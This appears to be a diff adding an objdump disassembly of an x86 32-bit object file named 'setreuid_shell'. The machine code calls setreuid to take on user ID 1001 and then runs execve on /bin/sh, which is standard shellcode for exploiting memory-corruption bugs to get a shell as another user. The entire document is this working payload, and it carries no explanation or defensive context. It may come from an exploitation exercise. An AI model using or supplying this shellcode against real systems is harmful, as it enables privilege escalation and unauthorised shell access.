@@ -1,0 +1,20 @@
+
+setreuid_shell.o:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+00000000 <setreuid_shell>:
+   0:	b8 46 00 00 00       	mov    $0x46,%eax
+   5:	bb e9 03 00 00       	mov    $0x3e9,%ebx
+   a:	b9 e9 03 00 00       	mov    $0x3e9,%ecx
+   f:	cd 80                	int    $0x80
+  11:	31 c0                	xor    %eax,%eax
+  13:	50                   	push   %eax
+  14:	68 2f 2f 73 68       	push   $0x68732f2f
+  19:	68 2f 62 69 6e       	push   $0x6e69622f
+  1e:	89 e3                	mov    %esp,%ebx
+  20:	89 c1                	mov    %eax,%ecx
+  22:	89 c2                	mov    %eax,%edx
+  24:	b0 0b                	mov    $0xb,%al
+  26:	cd 80                	int    $0x80
